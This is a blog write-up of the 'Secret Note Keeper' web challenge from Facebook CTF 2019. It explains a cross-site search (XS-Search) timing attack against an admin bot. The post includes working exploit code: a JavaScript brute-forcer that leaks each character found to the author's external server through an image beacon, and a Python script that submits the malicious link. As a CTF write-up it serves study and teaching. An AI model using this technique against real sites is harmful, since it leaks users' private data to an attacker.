---
title: "[Facebook CTF] Secret Note Keeper - Author: ducnt"
date: "2020-01-03"
categories: 
  - "ctf"
tags: 
  - "ducnt"
---

# [XS-Search - Secret Note Keeper, Facebook CTF 2019](http://www.ducnt.net/2019/06/xs-search-secret-note-keeper-facebook.html)

[![](images/Image%2Bfrom%2BiOS%2B%25281%2529.jpg)](https://1.bp.blogspot.com/-8hcdahr_2TM/XPQi1nZuG_I/AAAAAAAACSo/fDwVYOw_Kk4xxo75M_seLJ9nR2t1YZFqwCLcBGAs/s1600/Image%2Bfrom%2BiOS%2B%25281%2529.jpg)

_**The 0ld-day of facebook ctf**_

Hi guys, long time no write.

Last week, I played Facebook CTF 2019 with PwnPHOfun CTF team. This CTF really cool, nice web challs. I solved secret note keeper chall, below are the details.

**Overview:**

This chall opened with simple login register and login form. Let's create an account and review function.

[![](images/1.png)](https://1.bp.blogspot.com/-mYPFjXNcgRc/XPQHrDdyM7I/AAAAAAAACRo/_KyWB5qOT6Mn5W9Tb4vzQfp-5Sa1fURXgCLcBGAs/s1600/1.png)

**Workflow:**

- Create note: You can create note with note title as the name and body (secret info!) as the value (this is the secret one)
- Search notes: After create note, you can search about that note, just need input first character of the secret info.
- Report bugs: ¯\\\_(ツ)\_/¯ 
- [![](images/2.png)](https://1.bp.blogspot.com/-vaw91IZEd4A/XPQIu1p-SdI/AAAAAAAACR4/ANoQdwt8N20_LmIDEo1UeIckspvpeJyuwCLcBGAs/s1600/2.png)

After some fuzzing and testing with report bugs function, I got an outbound connection to my VPS.

> 54.202.247.24 - - \[01/Jun/2019:04:04:50 +0000\] "GET /ducnt.html HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.169 Safari/537.36"

HeadlessChrome, so basically, this chall really about client-side vulnerability.

[![](images/doubt%25281%2529%2B%25281%2529.png)](https://1.bp.blogspot.com/-L6bwUAljVsI/Vhvjv3iogXI/AAAAAAAABW8/QGt4aYab-BIzmNEir_WTJp3B1V8PXaW0QCPcBGAYYCw/s1600/doubt%25281%2529%2B%25281%2529.png)

So with the first sight with HeadlessChrome, I thought this chall is about XSS problem, however when testing with all fucntion, there are htmlentities filter, this going to a conclusion that exploit XSS vulnerability is impossible.

Looking about these function, I noticed that there is a problem in search notes function. Basically you just input the first character in secret info section, there is an iframe loaded with details of name and content of this note. This lead to a clue that really exist a vulnerability in report bugs function, and this vulnerability called XS-Search (sound familiar).

[![](images/16m4upj.gif)](https://1.bp.blogspot.com/-10GPgqdK-0c/VmHDtIgzO3I/AAAAAAAABbE/SzxaLujbXHw8XsRDnm-t24H0dwWHQaaTgCPcBGAYYCw/s1600/16m4upj.gif)

There are many article about this vulnerability, you can get some references at:

- [https://www.youtube.com/watch?v=HcrQy0C-hEA](https://www.youtube.com/watch?v=HcrQy0C-hEA)
- [https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549](https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549)
- [https://twitter.com/l4wio/status/1079108559504322560](https://twitter.com/l4wio/status/1079108559504322560)
- [https://portswigger.net/daily-swig/cross-site-search-attack-applied-to-snoop-on-googles-bug-tracker](https://portswigger.net/daily-swig/cross-site-search-attack-applied-to-snoop-on-googles-bug-tracker)

Let's me explain simple about that bug with my knowledge (correct me if I'm wrong :D). Basically if you have a banking account with $5M, somehow with this bug, I can extract your balance :D. That is the impact of this vulnerability.

Back to the chall, how to get the flag ???. In the description, author noted: Find the secret note that contains the fl4g!. So only admin can search fl4g note with flag detail. In this case, admin is bot. Somehow we will force bot for searching flag and return content with char by char for us.

[![](images/haha-icon.png)](https://1.bp.blogspot.com/-Nrp9CqsbY5Q/VjNGwP_LztI/AAAAAAAABYQ/bh4zJ7rOAZ8Q5yvENAK_mCLBP5kbqpOWwCPcBGAYYCw/s1600/haha-icon.png)

**Xploit flow:**

1. Prepare exploit script and host on your VPS.
2. Prepare exploit code that solve pow and automatic send your exploit script in (1).
3. Tracking in your access.log on your VPS with char by char of flag sent from bot.
4. Capture the flag.

 **Xploit code:**

exploit1337.html:

<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>ducnt-gopro</title>
</head>
<body>
<script src="exploit.js"></script>
</body>
</html>

 

exploit.js

const fengshui = 'http://challenges.fbctf.com:8082/search?query=';
const \_0x1337 = 'http://0x1337.space/fbctf2019/exploit3133737.html?a=';
let charset = "0123456789abcdefghijklmnopqrstuvwxyz{|}!\\"#$%&\\'()\*+,-./:;<=>?@\[\\\\\]^\_\`~";
const flag = "fb";
// const flag = "fb{";

// const flag = "fb{cr055\_s173\_l34|<5\_4r4\_c00ool!!}";
window.addEventListener('load', () => {
  let result = \[\];
  let i = 0;
  console.log(location.href.split('?')\[1\]);
  const brute = (i) => {
	      if (i === charset.length) {
	            const sorted = result.sort((x, y) => y\[1\] - x\[1\]);
	            const found = sorted\[0\]\[0\];
	            console.log(found);
	            (new Image).src = \_0x1337 + encodeURIComponent(JSON.stringify(sorted));
	            return;
	          }
	      let go;
	      let iframe = document.createElement('iframe');
	      iframe.src = fengshui + encodeURIComponent(flag + charset\[i\]);
	      iframe.addEventListener('load', () => {
		            document.body.removeChild(iframe);
		            result.push(\[charset\[i\], Date.now() - go\]);
		            setTimeout(() => { brute(i + 1); }, 100);
		          }, false);
	      go = Date.now();
	      document.body.appendChild(iframe);
	    };
  brute(0);
}, false);

 

exploit.py

#!/usr/bin/env python
# Author: ducnt

import requests
import hashlib
import random

def login():
	s = requests.Session()
	data = {"username":"ducnt3133737", "password":"ducnt3133737"}
	url = "http://challenges.fbctf.com:8082/login"
	r = s.post(url, data=data)
	url2 = "http://challenges.fbctf.com:8082/report\_bugs"
	r = s.get(url2)
	\_pow\_string = r.content
	a = r.content.find("proof of work for")
	\_check = \_pow\_string\[a+18:a+23\]

	return s.cookies,\_check

def pow(\_a):
	while 1:
		a = random.randint(0, 10000000000000)
		\_cp = hashlib.md5(str(a)).hexdigest()
		if \_cp\[:5\] == \_a:
			return a
			break

def exploit():
	fengshui\_cookies,\_check = login()
	\_pow = pow(\_check)

	fengshui\_url = "http://challenges.fbctf.com:8082/report\_bugs"
	fengshui\_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	fengshui\_data={"title": "f", "body": "f", "link": "http://0x1337.space/fbctf2019/exploit1337.html", "pow\_sol": str(\_pow)}
	r = requests.post(fengshui\_url, headers=fengshui\_headers, cookies=fengshui\_cookies, data=fengshui\_data)
	print r.content

exploit()

 

For example: I created a note with note title aaaaaaaa and content flag is: fbflagflag. Setup xploit script which brute force from fb keyword. And the next character expected is f:

[![](images/3.png)](https://1.bp.blogspot.com/-K7DdMJ1ZZBY/XPQg5SdPHaI/AAAAAAAACSg/fpTR8Z6JLIoeM4nAifJnwF1cV51SjFL3ACLcBGAs/s1600/3.png)

[![](images/4.png)](https://1.bp.blogspot.com/-0OvqlUpzWIQ/XPQhQ5ZABdI/AAAAAAAACSk/jv24zQXqVKwjAk-fphgJMZRcQR8u-bjYQCLcBGAs/s1600/4.png)

_It worked_

Running exploit simply: $ python exploit.py && tracking in your access.log. Update flag in const flag of exploit.js and repeat (because timeout is 5 seconds, so you can extract one or two character in one exploit session)

**Capture the flag:**

[![](images/step-by-step.png)](https://1.bp.blogspot.com/-BcKw7MEaSXs/XPQRXdTrMgI/AAAAAAAACSI/-hjpS4uZ6DYHSIyxfv9eu7eEDZmDf9BxgCLcBGAs/s1600/step-by-step.png)

And the flag is: **f****b{cr055\_s173\_l34|<5\_4r4\_c00ool!!}** (In the first extract, I get a wrong flag with just 1 byte :'(, this gave me 2 hours for troubleshoot).

[![](images/xs-search-solved.png)](https://1.bp.blogspot.com/-FCnmZnXsrLY/XPQUIbUBNSI/AAAAAAAACSU/1iAjlV42XtYXWz5ecsFjz071SsA6SMWUQCLcBGAs/s1600/xs-search-solved.png)

[![](images/tumblr_nvtdytiMqK1r41unfo1_250.gif)](https://1.bp.blogspot.com/-KyqSUfRFkXw/Vlmcb3jMRlI/AAAAAAAABZA/DB0VRXaEC5QtvgYPOM1MSj8U2rG0G64xQCPcBGAYYCw/s1600/tumblr_nvtdytiMqK1r41unfo1_250.gif)

Thanks for reading and sorry for my bad engrisk (toeic 900 :'( ). However, in this CTF, facebook used ctfd.io, I really miss the old of facebook CTF framework, it's really c00ool!!
